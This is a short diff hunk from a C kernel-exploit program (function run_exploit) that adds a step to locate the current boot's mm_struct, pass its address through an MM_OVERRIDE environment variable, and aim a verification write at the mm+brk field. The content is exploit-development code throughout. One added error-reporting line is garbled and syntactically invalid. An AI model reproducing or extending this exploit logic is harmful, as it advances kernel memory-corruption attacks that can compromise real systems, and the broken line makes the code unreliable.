@@ -948,6 +948,14 @@ int run_exploit(int argc, char **argv) {
       if (env_int_range("GL_VERIFY", 0, 0, 1)) {
         const char *vs = getenv("PVM_WRITE_VAL");
         uint64_t magic = vs && vs[0] ? strtoull(vs, NULL, 0) : 0xCAFEB0000ULL;
+        /* solve THIS boot's mm first (sets last_mm_struct), then fast-path */
+        if (!prepare_good_kernel_page(PAGE_PAYLOAD_FOPS)) {
+          pr_error("VERIFY: mm solve failed" + B + ");
+          goto after_w1c;
+        }
+        char mmhex[32];
+        snprintf(mmhex, sizeof(mmhex), "%zx", last_mm_struct);
+        setenv("MM_OVERRIDE", mmhex, 1);
         uintptr_t vt = last_mm_struct + 0x148;
         pr_info("VERIFY: target=%016zx (mm+brk) value=%016llx\n",
                 vt, (unsigned long long)magic);
